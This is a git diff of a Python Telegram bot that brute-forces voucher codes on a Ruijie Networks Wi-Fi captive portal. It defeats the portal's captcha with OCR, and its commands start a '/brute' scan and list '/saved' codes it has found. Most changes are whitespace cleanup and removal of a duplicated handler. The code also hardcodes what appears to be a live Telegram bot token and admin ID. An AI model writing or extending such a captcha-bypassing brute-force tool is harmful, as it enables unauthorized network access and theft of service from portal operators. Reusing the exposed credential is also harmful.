@@ -2,12 +2,12 @@ import os, subprocess, sys, time, asyncio, aiohttp, json, base64, random, re, st
 from datetime import datetime, timezone
 
 # --- Essential Auto-Installer ---
-def setup_env( ):
+def setup_env():
     packages = ["pyTelegramBotAPI", "aiohttp", "opencv-python-headless", "ddddocr", "numpy"]
     for p in packages:
         try:
             if p == "pyTelegramBotAPI": import telebot
-            else: __import__(p )
+            else: __import__(p)
         except ImportError:
             subprocess.check_call([sys.executable, "-m", "pip", "install", p])
 
@@ -21,7 +21,7 @@ import cv2, ddddocr, numpy as np
 # ─── CONFIGURATION ───
 BOT_TOKEN = "8809913843:AAGevNkeQJtPVNyr6u2R9KrdZvsy0KN9sJw"
 ADMIN_ID = "5510812164"
-bot = AsyncTeleBot(BOT_TOKEN )
+bot = AsyncTeleBot(BOT_TOKEN)
 
 _ocr = None
 _connector = None
@@ -64,7 +64,7 @@ def load_state():
 async def get_balance(sid):
     url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{sid}"
     try:
-        async with session.get(url, timeout=10 ) as r:
+        async with session.get(url, timeout=10) as r:
             data = await r.json()
             d = data.get("result") or data.get("data") or data
             for k in ["totalMinutes", "remainingMinutes", "balance"]:
@@ -74,7 +74,7 @@ async def get_balance(sid):
 
 async def perform_check(url, code, chat_id, scan_id):
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-    async with aiohttp.ClientSession(connector=_connector, connector_owner=False ) as s:
+    async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
         try:
             async with s.get(url, timeout=10) as r:
                 sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
@@ -82,7 +82,7 @@ async def perform_check(url, code, chat_id, scan_id):
             if not sid: return None
             
             p = {"sessionId": sid, "_t": str(time.time())}
-            async with s.get("https://portal-as.ruijienetworks.com/api/auth/captcha/image", params=p ) as r:
+            async with s.get("https://portal-as.ruijienetworks.com/api/auth/captcha/image", params=p) as r:
                 img = await r.read()
             
             nparr = np.frombuffer(img, np.uint8)
@@ -122,12 +122,8 @@ async def run_scan(chat_id, url, scan_id, p_msg):
 async def welcome(message):
     await bot.reply_to(message, "✅ Bot is Ready!\n\n/setup [url] - Portal URL သွင်းရန်\n/brute - Scan စတင်ရန်\n/stop - ရပ်တန့်ရန်\n/saved - တွေ့ထားသော Code များကြည့်ရန်")
 
-@bot.message_handler(commands=['setup'])
-async def setup(message):
 @bot.message_handler(commands=["setup"])
 async def setup(message):
-    args = message.text.split()
-    if len(args) < 2: return await bot.reply_to(message, "Usage: /setup [url]")
     args = message.text.split()
     if len(args) < 2: return await bot.reply_to(message, "Usage: /setup [url]")
     user_data[message.chat.id] = {"url": args[1]}
@@ -169,8 +165,8 @@ async def web_server():
 
 async def main():
     global session, _connector
-    _connector = aiohttp.TCPConnector(limit=50 )
-    session = aiohttp.ClientSession(connector=_connector )
+    _connector = aiohttp.TCPConnector(limit=50)
+    session = aiohttp.ClientSession(connector=_connector)
     load_state()
     asyncio.create_task(web_server())
     print("Bot is starting...")
